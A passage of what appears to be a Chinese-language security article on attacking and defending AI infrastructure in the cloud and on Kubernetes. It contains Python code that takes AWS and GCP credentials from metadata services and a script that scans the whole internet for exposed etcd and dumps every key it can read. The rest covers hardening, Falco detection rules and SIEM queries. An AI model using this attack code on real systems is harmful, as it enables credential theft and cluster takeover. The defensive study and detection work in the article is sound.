+                <span class="s2">&quot;AccessKeyId&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;AccessKeyId&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span>
+                <span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span>
+                <span class="s2">&quot;SessionToken&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;SessionToken&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+            <span class="p">}</span>
+
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] AWS credentials obtained!&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    AccessKeyId: </span><span class="si">{</span><span class="n">aws_creds</span><span class="p">[</span><span class="s1">&#39;AccessKeyId&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">aws_creds</span>
+
+        <span class="k">elif</span> <span class="n">cloud</span> <span class="o">==</span> <span class="s2">&quot;gcp&quot;</span><span class="p">:</span>
+            <span class="c1"># GKE: SA token → GCP access token</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="p">(</span>
+                <span class="s2">&quot;http://metadata.google.internal&quot;</span>
+                <span class="s2">&quot;/computeMetadata/v1/instance/service-accounts/default/token&quot;</span>
+            <span class="p">)</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+            <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Metadata-Flavor&quot;</span><span class="p">,</span> <span class="s2">&quot;Google&quot;</span><span class="p">)</span>
+
+            <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+            <span class="n">token_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] GCP access token obtained!&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">token_data</span>
+</code></pre></div>
+
+<hr />
+<h2>5. etcd 暴露攻击</h2>
+<h3>5.1 CVE-2025-1176：etcd 未认证访问</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># etcd 暴露检测 — 仅用于授权测试</span>
+
+<span class="c1"># 1. 扫描暴露的 etcd 端口 (2379)</span>
+masscan<span class="w"> </span><span class="m">0</span>.0.0.0/0<span class="w"> </span>-p<span class="w"> </span><span class="m">2379</span><span class="w"> </span>--rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-oJ<span class="w"> </span>etcd_scan.json
+
+<span class="c1"># 2. 检测未认证访问</span>
+<span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.[].ip&#39;</span><span class="w"> </span>etcd_scan.json<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Testing </span><span class="nv">$ip</span><span class="s2">:2379&quot;</span>
+
+<span class="w">    </span><span class="c1"># 尝试无认证访问</span>
+<span class="w">    </span><span class="nv">response</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$ip</span><span class="s2">:2379/v2/keys/&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$response</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.<span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[!] </span><span class="nv">$ip</span><span class="s2">:2379 - UNAUTHENTICATED ACCESS!&quot;</span>
+
+<span class="w">        </span><span class="c1"># 列出所有 key</span>
+<span class="w">        </span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$ip</span><span class="s2">:2379/v2/keys/?recursive=true&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.
+
+<span class="w">        </span><span class="c1"># 常见敏感 key:</span>
+<span class="w">        </span><span class="c1"># /registry/secrets/default/&lt;secret-name&gt;</span>
+<span class="w">        </span><span class="c1"># /registry/configmaps/kube-system/kubeadm-config</span>
+<span class="w">        </span><span class="c1"># /registry/serviceaccounts/default/default</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="c1"># 3. 提取凭证</span>
+<span class="c1"># etcd 存储了 K8s 集群的所有状态，包括:</span>
+<span class="c1"># - 所有 Secrets (base64 编码)</span>
+<span class="c1"># - ServiceAccount Tokens</span>
+<span class="c1"># - TLS 证书和私钥</span>
+<span class="c1"># - ConfigMaps 中的敏感配置</span>
+</code></pre></div>
+
+<h3>5.2 etcd 加固</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 启用 TLS 认证</span>
+<span class="c1"># /etc/kubernetes/manifests/etcd.yaml</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/kubernetes/manifests/etcd.yaml<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">apiVersion: v1</span>
+<span class="s">kind: Pod</span>
+<span class="s">metadata:</span>
+<span class="s">  name: etcd</span>
+<span class="s">  namespace: kube-system</span>
+<span class="s">spec:</span>
+<span class="s">  containers:</span>
+<span class="s">  - name: etcd</span>
+<span class="s">    command:</span>
+<span class="s">    - etcd</span>
+<span class="s">    - --cert-file=/etc/kubernetes/pki/etcd/server.crt</span>
+<span class="s">    - --key-file=/etc/kubernetes/pki/etcd/server.key</span>
+<span class="s">    - --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt</span>
+<span class="s">    - --peer-key-file=/etc/kubernetes/pki/etcd/peer.key</span>
+<span class="s">    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt</span>
+<span class="s">    - --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt</span>
+<span class="s">    - --client-cert-auth=true          # 关键: 强制客户端证书认证</span>
+<span class="s">    - --peer-client-cert-auth=true     # 强制 peer 证书认证</span>
+<span class="s">    - --listen-client-urls=https://127.0.0.1:2379  # 仅本地监听</span>
+<span class="s">    - --advertise-client-urls=https://127.0.0.1:2379</span>
+<span class="s">    volumeMounts:</span>
+<span class="s">    - name: etcd-certs</span>
+<span class="s">      mountPath: /etc/kubernetes/pki/etcd</span>
+<span class="s">      readOnly: true</span>
+<span class="s">  volumes:</span>
+<span class="s">  - name: etcd-certs</span>
+<span class="s">    hostPath:</span>
+<span class="s">      path: /etc/kubernetes/pki/etcd</span>
+<span class="s">      type: Directory</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 2. 防火墙规则: 阻断 2379 端口的外部访问</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">2379</span><span class="w"> </span>-s<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-j<span class="w"> </span>ACCEPT
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">2379</span><span class="w"> </span>-j<span class="w"> </span>DROP
+
+<span class="c1"># 3. 定期审计 etcd 访问</span>
+<span class="c1"># 启用 etcd 审计日志</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;--log-package-levels=etcdserver=debug&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/kubernetes/manifests/etcd.yaml
+</code></pre></div>
+
+<hr />
+<h2>6. 运行时检测体系</h2>
+<h3>6.1 Falco 规则集</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># falco-ai-infra-rules.yaml</span>
+<span class="c1"># AI 基础设施专用 Falco 检测规则</span>
+
+<span class="c1"># 规则 1: 容器内 shell 执行</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Shell Spawned in Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内启动 shell 进程</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">spawned_process and container and</span>
+<span class="w">    </span><span class="no">shell_procs and not shell_in_allowlist</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Shell spawned in container</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">image=%container.image.repository</span>
+<span class="w">     </span><span class="no">cmd=%proc.cmdline pid=%proc.pid</span>
+<span class="w">     </span><span class="no">namespace=%k8s.ns.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">shell</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">mitre_execution</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则 2: 容器访问宿主机敏感文件</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Container Reading Host Sensitive File</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器读取宿主机敏感文件（逃逸信号）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">open_read and container and</span>
+<span class="w">    </span><span class="no">(fd.name in (/host/etc/shadow, /host/proc/1/environ,</span>
+<span class="w">                 </span><span class="no">/proc/sys/kernel/core_pattern,</span>
+<span class="w">                 </span><span class="no">/proc/sysrq-trigger) or</span>
+<span class="w">     </span><span class="no">fd.name startswith /host/var/lib/kubelet/)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Container reading host sensitive file</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">file=%fd.name proc=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">filesystem</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则 3: 向 /proc/sys 写入（core_pattern 攻击）</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Write to Proc Sys</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测向 /proc/sys 写入（runc 逃逸利用）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">open_write and container and</span>
+<span class="w">    </span><span class="no">fd.name startswith /proc/sys/</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Write to /proc/sys from container</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">file=%fd.name proc=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">privilege_escalation</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则 4: 检测 IMDS 访问</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Container Accessing Cloud Metadata Service</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器访问云元数据服务</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">outbound and container and</span>
+<span class="w">    </span><span class="no">(fd.sip=&quot;169.254.169.254&quot; or</span>
+<span class="w">     </span><span class="no">fd.sip=&quot;metadata.google.internal&quot; or</span>
+<span class="w">     </span><span class="no">fd.sport in (80, 443))</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Container accessing cloud metadata service</span>
+<span class="w">    </span><span class="no">(container=%container.name image=%container.image.repository</span>
+<span class="w">     </span><span class="no">dest=%fd.sip:%fd.sport proc=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">cloud</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">imds</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">credential_access</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则 5: 特权容器创建</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Create Privileged Pod</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测创建特权 Pod 的请求</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">ka.req.pod.spec.containers.privileged intersect (true)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Privileged pod created</span>
+<span class="w">    </span><span class="no">(user=%ka.user.name pod=%ka.req.pod.name</span>
+<span class="w">     </span><span class="no">ns=%ka.req.pod.ns containers=%ka.req.pod.spec.containers.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">k8s</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">privilege_escalation</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则 6: 读取 K8s Secrets</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Read Kubernetes Secrets</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测大量读取 Secrets 的行为</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">ka.verb=get and ka.resource=secrets and</span>
+<span class="w">    </span><span class="no">ka.req.count &gt; 5</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Bulk secret reads detected</span>
+<span class="w">    </span><span class="no">(user=%ka.user.name ns=%ka.req.ns</span>
+<span class="w">     </span><span class="no">count=%ka.req.count)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">k8s</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">credential_access</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>6.2 K8s Audit Log 告警规则</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">K8s Audit Log SIEM 告警规则</span>
+<span class="sd">使用 Elasticsearch / Splunk / Loki 查询</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="c1"># Elastic KQL 查询: 危险 RBAC 变更</span>
+<span class="n">dangerous_rbac_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">kubernetes.audit.verb: (&quot;create&quot; or &quot;update&quot; or &quot;patch&quot;) and</span>
+<span class="s2">kubernetes.audit.resource: (&quot;clusterrolebindings&quot; or &quot;clusterroles&quot; or </span>
+<span class="s2">                            &quot;rolebindings&quot; or &quot;roles&quot;) and</span>
+<span class="s2">NOT kubernetes.audit.user.username: (&quot;system:kube-controller-manager&quot; or</span>
+<span class="s2">                                      &quot;system:kube-scheduler&quot;)</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+<span class="c1"># Splunk SPL: 特权 Pod 创建</span>
+<span class="n">splunk_priv_pod_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">index=k8s_audit verb=create resource=pods</span>
+<span class="s2">| search spec.containers</span><span class="si">{}</span><span class="s2">.securityContext.privileged=true</span>
+<span class="s2">| stats count by user.username, objectRef.namespace, objectRef.name</span>
+<span class="s2">| sort -count</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+<span class="c1"># 检测 ServiceAccount Token 异常使用</span>
+<span class="n">sa_token_abuse_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">index=k8s_audit</span>
+<span class="s2">(verb=get AND resource=secrets AND resourceName=&quot;*token*&quot;)</span>
+<span class="s2">OR</span>
+<span class="s2">(verb=create AND resource=pods AND </span>
+<span class="s2"> requestObject.spec.serviceAccountName!=&quot;default&quot; AND</span>
+<span class="s2"> requestObject.spec.hostPID=true)</span>
+<span class="s2">| stats count by user.username, sourceIPs</span><span class="si">{}</span><span class="s2">, verb, resource</span>
+<span class="s2">| where count &gt; 10</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+<span class="c1"># AWS CloudTrail: IMDS 凭证滥用</span>
+<span class="n">cloudtrail_imds_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">index=cloudtrail</span>
+<span class="s2">(eventSource=ec2.amazonaws.com AND eventName=GetInstanceIdentityDocument)</span>
+<span class="s2">OR</span>
+<span class="s2">(eventSource=sts.amazonaws.com AND eventName=AssumeRoleWithWebIdentity AND</span>
+<span class="s2"> userIdentity.sessionContext.sessionIssuer.arn=&quot;*AIInferenceRole*&quot;)</span>
+<span class="s2">| stats count by sourceIPAddress, userIdentity.arn</span>
+<span class="s2">| sort -count</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<hr />
+<h2>7. AI 基础设施安全加固清单</h2>
+<h3>7.1 云层加固</h3>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>优先级</th>
+<th>实施方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>强制 IMDSv2</td>
+<td>P0</td>
+<td><code>aws ec2 modify-instance-metadata-options --http-tokens required</code></td>
+</tr>
+<tr>
+<td>最小权限 IAM</td>
+<td>P0</td>
+<td>禁止 <code>*:*</code> 通配符，使用 IAM Access Analyzer</td>
+</tr>
+<tr>
+<td>隔离元数据访问</td>
+<td>P0</td>
+<td>NetworkPolicy 阻断 Pod → 169.254.169.254</td>
+</tr>
+<tr>
+<td>启用 CloudTrail</td>
+<td>P1</td>
+<td>全区域日志记录，集成 SIEM</td>
+</tr>
+<tr>
+<td>VPC Flow Logs</td>
+<td>P1</td>
+<td>检测异常网络流量</td>
+</tr>
+<tr>
+<td>Secrets Manager</td>
+<td>P1</td>
+<td>使用 External Secrets Operator + Vault</td>
+</tr>
+</tbody>
+</table>
+<h3>7.2 容器层加固</h3>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>优先级</th>
+<th>实施方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级 runc ≥ 1.2.8</td>
+<td>P0</td>
+<td>修复 CVE-2025-31133 系列</td>
+</tr>
+<tr>
+<td>升级 NVIDIA Toolkit ≥ 1.17.8</td>
+<td>P0</td>
+<td>修复 CVE-2025-23266</td>
+</tr>
+<tr>
+<td>Pod Security Admission</td>
+<td>P0</td>
+<td>namespace 标注 <code>enforce: restricted</code></td>
+</tr>
+<tr>
+<td>禁用特权容器</td>
+<td>P0</td>
+<td><code>privileged: false</code> + <code>allowPrivilegeEscalation: false</code></td>
+</tr>
+<tr>
+<td>只读根文件系统</td>
+<td>P1</td>
+<td><code>readOnlyRootFilesystem: true</code></td>
+</tr>
+<tr>
+<td>Seccomp Profile</td>
+<td>P1</td>
+<td><code>seccompProfile: RuntimeDefault</code></td>
+</tr>
+<tr>
+<td>镜像签名验证</td>
+<td>P1</td>
+<td>Cosign + Kyverno 策略</td>
+</tr>
+<tr>
+<td>禁用 latest 标签</td>
+<td>P1</td>
+<td>使用 digest 固定</td>
+</tr>
+</tbody>
+</table>
+<h3>7.3 K8s 层加固</h3>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>优先级</th>
+<th>实施方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级 Ingress-NGINX</td>
+<td>P0</td>
+<td>修复 CVE-2025-1974</td>
+</tr>
+<tr>
+<td>etcd TLS 认证</td>
+<td>P0</td>
+<td><code>--client-cert-auth=true</code></td>
+</tr>
+<tr>
+<td>RBAC 最小权限</td>
+<td>P0</td>
+<td>禁止通配符权限，禁止 SA 绑定 cluster-admin</td>
+</tr>
+<tr>
+<td>关闭 SA Token 自动挂载</td>
+<td>P1</td>
+<td><code>automountServiceAccountToken: false</code></td>
+</tr>
+<tr>
+<td>默认拒绝网络策略</td>
+<td>P1</td>
+<td><code>default-deny-all</code></td>
+</tr>
+<tr>
+<td>启用审计日志</td>
+<td>P1</td>
+<td><code>--audit-log-path</code> + SIEM 集成</td>
+</tr>
+<tr>
+<td>部署 Falco</td>
+<td>P1</td>
+<td>运行时入侵检测</td>
+</tr>
+<tr>
+<td>定期 RBAC 审计</td>
+<td>P2</td>
+<td><code>kubectl auth can-i --list</code> 全量扫描</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>8. 总结</h2>
+<table>
+<thead>
+<tr>
+<th>攻击面</th>
+<th>核心威胁</th>
+<th>关键防御</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>云 IMDS</td>
+<td>SSRF → 凭证窃取 → 云接管</td>
+<td>IMDSv2 + NetworkPolicy</td>
+</tr>
+<tr>
+<td>runc</td>
+<td>符号链接 + masked path 逃逸</td>
+<td>升级 ≥ 1.2.8 + PSA restricted</td>
+</tr>
+<tr>
+<td>NVIDIA Toolkit</td>
+<td>LD_PRELOAD → 主机 root</td>
+<td>升级 ≥ 1.17.8 + seccomp</td>
+</tr>
+<tr>
+<td>Ingress-NGINX</td>
+<td>AdmissionReview 注入 RCE</td>
+<td>升级 + 限制 webhook 访问</td>
+</tr>
+<tr>
+<td>etcd</td>
+<td>未认证读取集群全部数据</td>
+<td>TLS + client-cert-auth</td>
+</tr>
+<tr>
+<td>K8s RBAC</td>
+<td>SA Token → Workload Identity → 云 IAM</td>
+<td>最小权限 + 关闭自动挂载</td>
+</tr>
+</tbody>
+</table>
+<p><strong>核心原则</strong>：AI 基础设施安全 = 云安全 + 容器安全 + K8s 安全 + AI 模型安全的纵深防御体系。任何单层防御被突破都可能导致模型权重泄露、训练数据外泄或整个云账户被接管。</p>
+<hr />
+<blockquote>
+<p><strong>免责声明重申</strong>：本文所有漏洞分析、PoC 代码和攻击链复现均基于公开披露的安全研究资料和 CVE 官方公告。所有代码仅用于理解攻击原理以构建防御体系。读者必须在授权的测试环境中使用相关技术，未经授权对任何系统进行渗透测试属于违法行为。作者不对任何因不当使用本文信息而造成的后果承担责任。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
